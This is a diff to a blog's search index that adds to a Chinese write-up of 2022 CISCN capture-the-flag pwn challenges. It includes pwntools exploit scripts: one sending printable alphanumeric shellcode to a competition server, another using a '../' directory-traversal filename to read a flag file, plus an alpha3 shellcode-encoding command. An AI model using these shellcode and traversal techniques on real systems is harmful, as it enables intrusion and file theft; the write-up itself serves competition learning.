@@ -1,22 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2022ciscn线上赛 pwn</title>
-    <url>/2022/07/05/2022-07-05-2022ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年ciscn线上赛总共三题pwn，一题算是签到，一题2.34的堆做一半没成功，一题LLVM PASS没学过完全不会</p>
+    <title>2022ciscn pwn</title>
+    <url>/2022/07/05/2022-07-05-2022ciscn-pwn/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年ciscn线上赛总共三题pwn，一题算是签到，一题2.34的堆做一半没成功，一题LLVM PASS没学过完全不会。分区赛六题pwn，awdplus的模式，成了修洞的乐园。</p>
 <h1 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h1><p>这题其实做过类似的，在蓝帽杯还是哪来着做过，在代码审计部分差不多一致，只是在最后的利用过程有改动。首先就是一个循环执行函数，接着看函数的主要内容。</p>
-<p><img src="/2022/07/05/2022-07-05-2022ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/image-20220705213148416.png"><span class="image-caption">image-20220705213148416</span></p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213148416.png"><span class="image-caption">image-20220705213148416</span></p>
 <p>接着看又是一个循环，这个循环就是这题最麻烦的点了，需要一步步的耐心整理，当时我做是直接找了类似题目进行比较的，所以没花多少功夫。</p>
-<p><img src="/2022/07/05/2022-07-05-2022ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/image-20220705213257184.png"><span class="image-caption">image-20220705213257184</span></p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213257184.png"><span class="image-caption">image-20220705213257184</span></p>
 <p>审完上面的代码，接下来就是主要的菜单内容，主要关注1和3执行的内容。</p>
-<p><img src="/2022/07/05/2022-07-05-2022ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/image-20220705213831271.png"><span class="image-caption">image-20220705213831271</span></p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213831271.png"><span class="image-caption">image-20220705213831271</span></p>
 <p>在执行1函数可以设置一个flag为1，这个为3执行到mmap提供真的判断条件，而要能够执行这串代码，需要的是先通过isprint的检验，所以就是只能输入明文字符，这就涉及到的一个考点就是明文字符书写shellcode。明文字符生成可以通过alpha3或者AE64进行自动生成。我使用的是alpha3，执行命令为：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x64 ascii mixedcase rdx --input=&quot;shellcode&quot;<br></code></pre></td></tr></table></figure>
 
 <p>rdx是指call后面跟着的那个寄存器，也就是存放shellcode首地址的寄存器。</p>
-<p><img src="/2022/07/05/2022-07-05-2022ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/image-20220705213700566.png"><span class="image-caption">image-20220705213700566</span></p>
-<p><img src="/2022/07/05/2022-07-05-2022ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/image-20220705213732318.png"><span class="image-caption">image-20220705213732318</span></p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213700566.png"><span class="image-caption">image-20220705213700566</span></p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220705213732318.png"><span class="image-caption">image-20220705213732318</span></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./login&#x27;</span>)<br>DEBUG = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&quot;</span>)<br>    ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so&quot;</span>)<br>    p = process(argv=[ld.path,elf.path], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>    p = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;47.93.156.2&#x27;</span><br>    port = <span class="hljs-number">24875</span><br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    p = remote(ip, port)<br> <br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p, <span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opt:1\nmsg:ro0ta\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><span class="hljs-comment">#debug()</span><br>p.send(<span class="hljs-string">&quot;opt:2\nmsg:Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070ta\n\r\r\n&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p>这题跑去问了柘狐师傅，也是个签到题。但是比赛那会没做出来，太菜了。</p>
+<p>利用点在于black初始值是为0的，那么没有过滤<code>..</code></p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707093637899.png"><span class="image-caption">image-20220707093637899</span></p>
+<p>同时，因为可以输入文件的名字，并且是可以含有<code>.</code>和<code>/</code>，那么就存在了目录穿越的问题，利用<code>../</code>可以返回到上一级的特点，可以把flag内容打印出来。</p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707093800921.png"><span class="image-caption">image-20220707093800921</span></p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707093746094.png"><span class="image-caption">image-20220707093746094</span></p>
+<p>打印出的内容为base64加密的结果，解码即可。</p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707094151700.png"><span class="image-caption">image-20220707094151700</span></p>
+<p><img src="/2022/07/05/2022-07-05-2022ciscn-pwn/image-20220707094220973.png"><span class="image-caption">image-20220707094220973</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&#x27;172.16.9.45&#x27;, 8087)</span><br>p = process(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change filename? (y/N)&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;y&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input new filename: &quot;</span>)<br>p.send(<span class="hljs-string">&quot;../home/shoucheng/pwn/flag\n&quot;</span>)<br>p.shutdown(<span class="hljs-string">&#x27;write&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
 
 ]]></content>
   </entry>
@@ -4928,8 +4941,8 @@
 <td>调动gdb进行脚本调式</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td>shutdown(‘in’)</td>
+<td>参数为in/read/recv时关闭输出流，参数为out/write/send关闭输入流</td>
 </tr>
 <tr>
 <td></td>
